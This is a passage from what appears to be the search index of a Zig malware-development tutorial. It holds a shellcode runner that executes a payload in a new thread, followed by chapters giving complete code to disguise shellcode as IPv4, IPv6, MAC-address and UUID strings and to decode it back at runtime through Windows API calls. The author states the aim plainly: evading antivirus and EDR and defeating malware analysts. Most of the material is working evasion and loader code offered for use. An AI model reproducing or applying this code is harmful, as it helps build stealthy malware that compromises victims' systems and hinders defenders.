\\n\", .{GetLastError()});\n        std.process.exit(1);\n    }\n\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Run ... \");\n\n    // Execute the shellcode in a new thread\n    const thread_handle = CreateThread(null, 0, @ptrCast(p_shellcode_address), null, 0, null) orelse {\n        print(\"[!] CreateThread Failed With Error : {d} \\n\", .{GetLastError()});\n        std.process.exit(1);\n    };\n\n    _ = thread_handle; // Suppress unused variable warning\n\n    // NOTE:\n    // You can also execute the payload using function pointer.\n    // In C, you might do this:\n    // ```c\n    // (*(VOID(*)()) pShellcodeAddress)();\n    // ```\n    // And in Zig, the following code it equivalent to that.\n    // ```zig\n    // (@as(*const fn () void, @ptrCast(p_shellcode_address)))();\n    // ```\n    // So you can use that to execute the payload. However, it's not suggested.\n    // It's because the shellcode will terminates the calling thread\n    // after executing. But if we use function pointer to execute it, the calling\n    // thread will become the main thread, causing the entire process to exit\n    // after the shellcode is executed.\n\n    print(\"[+] Calculator should launch now!\\n\", .{});\n    waitForEnter(\"[#] Press &lt;Enter&gt; To Quit ... \"); // Pause the execution.\n\n    return;\n\n    // NOTE:\n    // If we don't use `waitForEnter()` here, the main thread might have high\n    // possibility to exit before the shellcode being executed. So here we use\n    // that function to pause the execution.\n    // In practice, we should use `WaitForSingleObject()` function from Windows API\n    // to wait until the new thread to finish or the thread it timed out. So that\n    // the main thread will not exit before the shellcode execution.\n    // MSDN: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/","title":"IP Address Obfuscation","text":""},{"location":"Payload-Obfuscation/ip_addr/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Obfuscation/ip_addr/#intro","title":"Intro","text":"<p>Actually, to evade AV/EDR, you can do more than just hiding your payload in different section. You need to obfuscate the code so that the reverse engineers and malware analyst can't get the clear logic, control flow, or meaningful strings without heavily static or dynamic analysis.</p> <p>In this chapter, I will show you how to obfuscate your payload as IP address. We have both IPv4 and IPv6. Also, we provide the deobfuscation functions so that you can run the actual payload later on your malware.</p>"},{"location":"Payload-Obfuscation/ip_addr/#ipv4-obfuscation","title":"IPv4 Obfuscation","text":"<p>IPv4 is constructed with 4 numbers from 0 to 255 with the size range of the number is 256 (2^8). So each number can represent 1 byte of the payload. If we represent the payload in hex, for example, we let the payload to be this.</p> <pre><code>const payload = [_]u8{0xDE, 0xAD, 0xBE, 0xEF};\n</code></pre> <p>That payload is 4 bytes in total. Then the IPv4 obfuscation result will be 222.173.190.239. If you don't know how to convert decimal to hexadecimal or vice versa, you should go learn it first to better understand the content.</p> <p>In Zig, an 8 byte value can use the type <code>u8</code>, which stands for unsigned integer with 8 bits size. So the implementation is simple, just convert the decimal to hexadecimal representation. Since they're all just integers, we can use the format string to do this.</p> main.zig<pre><code>const std = @import(\"std\");\nconst Allocator = std.mem.Allocator;\n\n// Function takes in 4 raw bytes and returns them in an IPv4 string format\nfn generateIpv4(allocator: Allocator, a: u8, b: u8, c: u8, d: u8) ![]u8 {\n    // Creating the IPv4 address string\n    return try std.fmt.allocPrint(allocator, \"{d}.{d}.{d}.{d}\", .{ a, b, c, d });\n}\n\n/// Generate the IPv4 output representation of the shellcode\n/// Function requires an allocator and shellcode as the input\nfn generateIpv4Output(allocator: Allocator, shellcode: []const u8) !bool {\n    const stdout = std.io.getStdOut().writer();\n\n    // If the shellcode buffer is empty or the size is not a multiple of 4, exit\n    if (shellcode.len == 0 or shellcode.len % 4 != 0) {\n        return false;\n    }\n\n    try stdout.print(\"const ipv4_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address\n    // The variable 'c' is used to store the number of bytes read. By default, starts at 4.\n    var c: usize = 4;\n    var counter: usize = 0;\n\n    var i: usize = 0;\n    while (i &lt; shellcode.len) : (i += 1) {\n        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address\n        if (c == 4) {\n            counter += 1;\n\n            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3]\n            const ip = try generateIpv4(allocator, shellcode[i], shellcode[i + 1], shellcode[i + 2], shellcode[i + 3]);\n            defer allocator.free(ip); // Free the allocated string when done\n\n            if (i == shellcode.len - 4) {\n                // Printing the last IPv4 address\n                try stdout.print(\"\\\"{s}\\\"\", .{ip});\n                break;\n            } else {\n                // Printing the IPv4 address\n                try stdout.print(\"\\\"{s}\\\", \", .{ip});\n            }\n\n            c = 1;\n\n            // Optional: To beautify the output on the console\n            if (counter % 8 == 0) {\n                try stdout.print(\"\\n\\t\", .{});\n            }\n        } else {\n            c += 1;\n        }\n    }\n\n    try stdout.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Create an arena allocator that frees all allocations at once at the end\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n\n    const allocator = arena.allocator();\n    // Example shellcode (must be a multiple of 4 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Generate and print the IPv4 representation\n    _ = try generateIpv4Output(allocator, &amp;shellcode);\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/#ipv4-deobfuscation","title":"IPv4 Deobfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst BOOLEAN = win.BOOLEAN;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlIpv4StringToAddressA\nconst fnRtlIpv4StringToAddressA = fn (\n    S: PCSTR,\n    Strict: BOOLEAN,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of IPv4 strings into a byte buffer\npub fn ipv4Deobfuscation(\n    ipv4Array: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlIpv4StringToAddressA function\n    const rtlIpv4StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlIpv4StringToAddressA\");\n    if (rtlIpv4StringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlIpv4StringToAddressA: *const fnRtlIpv4StringToAddressA = @ptrCast(rtlIpv4StringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of IPv4 addresses * 4 bytes each)\n    const bufferSize = ipv4Array.len * 4;\n\n    // Allocate memory for the deobfuscated shellcode\n    var buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Deobfuscate each IPv4 address\n    for (ipv4Array, 0..) |ipAddress, i| {\n        var terminator: PCSTR = undefined;\n\n        // Calculate the offset in the buffer for this IPv4 address\n        const offset = i * 4;\n\n        // Convert the IPv4 string to bytes\n        const status = rtlIpv4StringToAddressA(ipAddress, win.FALSE, &amp;terminator, &amp;buffer[offset]);\n\n        // Check if the status is not SUCCESS (0)\n        // Use the proper status constant from the ntstatus module\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlIpv4StringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ ipAddress, @intFromEnum(status) });\n            return error.RtlIpv4StringToAddressFailed;\n        }\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of IPv4 addresses\n    const ipv4_array = [_][*:0]const u8{ \"252.72.131.228\", \"240.232.192.0\", \"0.0.65.81\", \"65.80.82.81\" };\n    std.debug.print(\"[+] Attempting to deobfuscate {} IPv4 addresses\\n\", .{ipv4_array.len});\n\n    // Call the deobfuscation function\n    const result = try ipv4Deobfuscation(&amp;ipv4_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Optionally print the bytes (first 16 bytes or fewer if smaller)\n    const bytes_to_print = @min(result.size, 16);\n    std.debug.print(\"[+] First {} bytes: \", .{bytes_to_print});\n    for (result.buffer[0..bytes_to_print]) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/#ipv6-obfuscation","title":"IPv6 Obfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst Allocator = std.mem.Allocator;\n\n/// Function takes in 16 raw bytes and returns them in an IPv6 address string format\nfn generateIpv6(allocator: Allocator, bytes: [16]u8) ![]u8 {\n    // Each segment is 2 bytes (4 hex characters + colon)\n    // Format as 8 segments of 2 bytes each with colons between them\n    return try std.fmt.allocPrint(\n        allocator,\n        \"{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}\",\n        .{\n            bytes[0],  bytes[1],  bytes[2],  bytes[3],\n            bytes[4],  bytes[5],  bytes[6],  bytes[7],\n            bytes[8],  bytes[9],  bytes[10], bytes[11],\n            bytes[12], bytes[13], bytes[14], bytes[15],\n        },\n    );\n}\n\n/// Generate the IPv6 output representation of the shellcode\n/// Function requires a slice to the shellcode buffer\nfn generateIpv6Output(allocator: Allocator, shellcode: []const u8) !bool {\n    const stdout = std.io.getStdOut().writer();\n\n    // If the shellcode buffer is empty or the size is not a multiple of 16, exit\n    if (shellcode.len == 0 or shellcode.len % 16 != 0) {\n        return false;\n    }\n\n    try stdout.print(\"const ipv6_array = [_][*:0]const u8{{\\n    \", .{});\n\n    // We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address\n    // The variable 'c' is used to store the number of bytes read. By default, starts at 16.\n    var c: usize = 16;\n    var counter: usize = 0;\n\n    var i: usize = 0;\n    while (i &lt; shellcode.len) : (i += 1) {\n        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address\n        if (c == 16) {\n            counter += 1;\n\n            // Create a temporary array to hold the 16 bytes\n            var temp_bytes: [16]u8 = undefined;\n            @memcpy(temp_bytes[0..], shellcode[i..][0..16]);\n\n            // Generating the IPv6 address from 16 bytes\n            const ip = try generateIpv6(allocator, temp_bytes);\n            defer allocator.free(ip);\n\n            if (i == shellcode.len - 16) {\n                // Printing the last IPv6 address\n                try stdout.print(\"\\\"{s}\\\"\", .{ip});\n                break;\n            } else {\n                // Printing the IPv6 address\n                try stdout.print(\"\\\"{s}\\\", \", .{ip});\n            }\n\n            c = 1;\n\n            // Optional: To beautify the output on the console\n            if (counter % 3 == 0) {\n                try stdout.print(\"\\n    \", .{});\n            }\n        } else {\n            c += 1;\n        }\n    }\n\n    try stdout.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Create an arena allocator for efficient memory management\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n\n    const allocator = arena.allocator();\n\n    // Example shellcode (must be a multiple of 16 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Generate and print the IPv6 representation\n    _ = try generateIpv6Output(allocator, &amp;shellcode);\n}\n</code></pre>"},{"location":"Payload-Obfuscation/ip_addr/#ipv6-deobfuscation","title":"IPv6 Deobfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst BOOLEAN = win.BOOLEAN;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlIpv6StringToAddressA\nconst fnRtlIpv6StringToAddressA = fn (\n    S: PCSTR,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of IPv6 strings into a byte buffer\npub fn ipv6Deobfuscation(\n    ipv6Array: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlIpv6StringToAddressA function\n    const rtlIpv6StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlIpv6StringToAddressA\");\n    if (rtlIpv6StringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlIpv6StringToAddressA: *const fnRtlIpv6StringToAddressA = @ptrCast(rtlIpv6StringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of IPv6 addresses * 16 bytes each)\n    const bufferSize = ipv6Array.len * 16; // IPv6 addresses are 16 bytes each\n\n    // Allocate memory for the deobfuscated shellcode\n    const buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Using a raw pointer to keep track of our current position\n    var tmpBuffer: [*]u8 = buffer.ptr;\n\n    // Deobfuscate each IPv6 address\n    for (ipv6Array) |ipv6Address| {\n        var terminator: PCSTR = undefined;\n\n        // Convert the IPv6 string to bytes\n        const status = rtlIpv6StringToAddressA(ipv6Address, &amp;terminator, tmpBuffer);\n\n        // Check if the status is not SUCCESS (0)\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlIpv6StringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ ipv6Address, @intFromEnum(status) });\n            return error.RtlIpv6StringToAddressFailed;\n        }\n\n        // Increment tmpBuffer by 16 bytes for the next address\n        // Fixed version using pointer arithmetic\n        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 16));\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of IPv6 addresses (shellcode encoded as IPv6)\n    const ipv6_array = [_][*:0]const u8{\n        \"fc48:83e4:f0e8:c000:0000:4151:4150:5251\",\n    };\n\n    std.debug.print(\"[+] Attempting to deobfuscate {} IPv6 addresses\\n\", .{ipv6_array.len});\n\n    // Call the deobfuscation function\n    const result = try ipv6Deobfuscation(&amp;ipv6_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Print all bytes\n    std.debug.print(\"[+] Deobfuscated bytes: \", .{});\n    for (result.buffer) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Payload-Obfuscation/mac_addr/","title":"MAC Address Obfuscation","text":""},{"location":"Payload-Obfuscation/mac_addr/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Obfuscation/mac_addr/#obfuscation","title":"Obfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\n\n/// Generates a MAC address string from 6 raw bytes\nfn generateMAC(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, buffer: []u8) []const u8 {\n    // Format the 6 bytes as a MAC address string (XX-XX-XX-XX-XX-XX)\n    return std.fmt.bufPrint(buffer, \"{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}\", .{\n        a, b, c, d, e, f,\n    }) catch unreachable;\n}\n\n/// Generate the MAC output representation of the shellcode\nfn generateMacOutput(pShellcode: []const u8, writer: anytype) !bool {\n    const shellcodeSize = pShellcode.len;\n\n    // If the shellcode buffer is empty or the size is not a multiple of 6, exit\n    if (shellcodeSize == 0 or shellcodeSize % 6 != 0) {\n        return false;\n    }\n\n    try writer.print(\"const mac_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // Buffer to hold the MAC address string (XX-XX-XX-XX-XX-XX = 17 chars + null)\n    var macBuffer: [32]u8 = undefined;\n\n    var counter: usize = 0;\n\n    // Process the shellcode in groups of 6 bytes\n    var i: usize = 0;\n    while (i &lt; shellcodeSize) {\n        // Generate a MAC address from the current 6 bytes\n        const mac = generateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], &amp;macBuffer);\n\n        counter += 1;\n\n        // Print the MAC address\n        if (i == shellcodeSize - 6) {\n            // Last MAC address\n            try writer.print(\"\\\"{s}\\\"\", .{mac});\n        } else {\n            // Not the last one, add comma\n            try writer.print(\"\\\"{s}\\\", \", .{mac});\n        }\n\n        // Move to the next group of 6 bytes\n        i += 6;\n\n        // Add a newline for formatting after every 6 MAC addresses\n        if (counter % 6 == 0 and i &lt; shellcodeSize) {\n            try writer.print(\"\\n\\t\", .{});\n        }\n    }\n\n    try writer.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Example shellcode (must be a multiple of 6 bytes)\n    const shellcode = [_]u8{\n        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, // 1st MAC\n        0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, // 2nd MAC\n        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, // 3rd MAC\n        0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, // 4th MAC\n        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, // 5th MAC\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, // 6th MAC\n        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, // 7th MAC\n    };\n\n    // Use stdout as the writer\n    const stdout = std.io.getStdOut().writer();\n\n    std.debug.print(\"[+] Generating MAC address representation for {} bytes of shellcode\\n\", .{shellcode.len});\n\n    // Generate and print the MAC address representation\n    if (try generateMacOutput(&amp;shellcode, stdout)) {} else {\n        std.debug.print(\"[!] Failed to generate MAC address representation\\n\", .{});\n    }\n}\n</code></pre>"},{"location":"Payload-Obfuscation/mac_addr/#deobfuscation","title":"Deobfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlEthernetStringToAddressA\nconst fnRtlEthernetStringToAddressA = fn (\n    S: PCSTR,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of MAC addresses into a byte buffer\npub fn macDeobfuscation(\n    macArray: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlEthernetStringToAddressA function\n    const rtlEthernetStringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlEthernetStringToAddressA\");\n    if (rtlEthernetStringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlEthernetStringToAddressA: *const fnRtlEthernetStringToAddressA = @ptrCast(rtlEthernetStringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of MAC addresses * 6 bytes each)\n    const bufferSize = macArray.len * 6; // MAC addresses are 6 bytes each\n\n    // Allocate memory for the deobfuscated shellcode\n    const buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Using a raw pointer to keep track of our current position\n    var tmpBuffer: [*]u8 = buffer.ptr;\n\n    // Deobfuscate each MAC address\n    for (macArray) |macAddress| {\n        var terminator: PCSTR = undefined;\n\n        // Convert the MAC address string to bytes\n        const status = rtlEthernetStringToAddressA(macAddress, &amp;terminator, tmpBuffer);\n\n        // Check if the status is not SUCCESS (0)\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlEthernetStringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ macAddress, @intFromEnum(status) });\n            return error.RtlEthernetStringToAddressFailed;\n        }\n\n        // Increment tmpBuffer by 6 bytes for the next address\n        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 6));\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of MAC addresses (shellcode encoded as MAC)\n    const mac_array = [_][*:0]const u8{ \"FC-48-83-E4-F0-E8\", \"C0-00-00-00-41-51\", \"41-50-52-51-56-48\", \"31-D2-65-48-8B-52\", \"60-48-8B-52-18-48\", \"8B-52-20-48-8B-72\", \"50-48-0F-B7-4A-4A\" };\n    std.debug.print(\"[+] Attempting to deobfuscate {} MAC addresses\\n\", .{mac_array.len});\n\n    // Call the deobfuscation function\n    const result = try macDeobfuscation(&amp;mac_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Print all bytes\n    std.debug.print(\"[+] Deobfuscated bytes: \", .{});\n    for (result.buffer) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Payload-Obfuscation/uuid/","title":"UUID Obfuscation","text":""},{"location":"Payload-Obfuscation/uuid/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Obfuscation/uuid/#obfuscation","title":"Obfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\n\n/// Generates a UUID string from 16 raw bytes\nfn generateUuid(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8, m: u8, n: u8, o: u8, p: u8, buffer: []u8) ![]const u8 {\n    // In Zig, we can directly format the entire UUID in one go instead of\n    // creating intermediate segments as in the C version\n    return try std.fmt.bufPrint(buffer, \"{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}\", .{ d, c, b, a, f, e, h, g, i, j, k, l, m, n, o, p });\n}\n\n/// Generate the UUID output representation of the shellcode\nfn generateUuidOutput(pShellcode: []const u8, writer: anytype) !bool {\n    const shellcodeSize = pShellcode.len;\n\n    // If the shellcode buffer is empty or the size is not a multiple of 16, exit\n    if (shellcodeSize == 0 or shellcodeSize % 16 != 0) {\n        return false;\n    }\n\n    try writer.print(\"const uuid_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // Buffer to hold the UUID string (36 chars + null terminator)\n    var uuidBuffer: [40]u8 = undefined;\n\n    // Process the shellcode in groups of 16 bytes\n    var counter: usize = 0;\n    var i: usize = 0;\n\n    while (i &lt; shellcodeSize) {\n        // Make sure we have 16 bytes available\n        if (i + 15 &gt;= shellcodeSize) break;\n\n        counter += 1;\n\n        // Generate the UUID from the current 16 bytes\n        const uuid = try generateUuid(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7], pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11], pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15], &amp;uuidBuffer);\n\n        // Print the UUID\n        if (i == shellcodeSize - 16) {\n            // Last UUID\n            try writer.print(\"\\\"{s}\\\"\", .{uuid});\n        } else {\n            // Not the last one, add comma\n            try writer.print(\"\\\"{s}\\\", \", .{uuid});\n        }\n\n        // Move to next group of 16 bytes\n        i += 16;\n\n        // Add a newline for formatting after every 3 UUIDs\n        if (counter % 3 == 0 and i &lt; shellcodeSize) {\n            try writer.print(\"\\n\\t\", .{});\n        }\n    }\n\n    try writer.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Example shellcode (must be a multiple of 16 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Use stdout as the writer\n    const stdout = std.io.getStdOut().writer();\n\n    std.debug.print(\"[+] Generating UUID representation for {} bytes of shellcode\\n\", .{shellcode.len});\n\n    // Generate and print the UUID representation\n    if (try generateUuidOutput(&amp;shellcode, stdout)) {} else {\n        std.debug.print(\"[!] Failed to generate UUID representation\\n\", .{});\n    }\n}\n</code></pre>"},{"location":"Payload-Obfuscation/uuid/#deobfuscation","title":"Deobfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst WINAPI = windows.WINAPI;\n\n// Type definitions\nconst RPC_STATUS = u32;\nconst RPC_CSTR = [*:0]const u8;\nconst UUID = extern struct {\n    data1: u32,\n    data2: u16,\n    data3: u16,\n    data4: [8]u8,\n};\n\nconst RPC_S_OK: RPC_STATUS = 0;\n\n// Function pointer type for UuidFromStringA\nconst UuidFromStringAFn = *const fn (RPC_CSTR, *UUID) callconv(WINAPI) RPC_STATUS;\n\n// External function declarations\nextern \"kernel32\" fn GetProcAddress(hModule: windows.HMODULE, lpProcName: [*:0]const u8) callconv(WINAPI) ?windows.FARPROC;\nextern \"kernel32\" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(WINAPI) ?windows.HMODULE;\nextern \"kernel32\" fn GetProcessHeap() callconv(WINAPI) windows.HANDLE;\nextern \"kernel32\" fn HeapAlloc(hHeap: windows.HANDLE, dwFlags: windows.DWORD, dwBytes: usize) callconv(WINAPI) ?*anyopaque;\nextern \"kernel32\" fn HeapFree(hHeap: windows.HANDLE, dwFlags: windows.DWORD, lpMem: ?*anyopaque) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) windows.DWORD;\n\nconst HEAP_ZERO_MEMORY: windows.DWORD = 0x00000008;\n\npub fn uuidDeobfuscation(\n    uuid_array: []const [*:0]const u8,\n    pp_d_address: *?[*]u8,\n    p_d_size: *usize,\n) bool {\n    // Getting UuidFromStringA address from Rpcrt4.dll\n    const rpcrt4_handle = LoadLibraryA(\"RPCRT4\") orelse {\n        std.debug.print(\"[!] LoadLibrary Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    };\n\n    const proc_addr = GetProcAddress(rpcrt4_handle, \"UuidFromStringA\") orelse {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    };\n\n    const uuid_from_string_a: UuidFromStringAFn = @ptrCast(proc_addr);\n\n    // Getting the real size of the shellcode which is the number of UUID strings * 16\n    const buff_size = uuid_array.len * 16;\n\n    // Allocating memory which will hold the deobfuscated shellcode\n    const buffer_ptr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buff_size) orelse 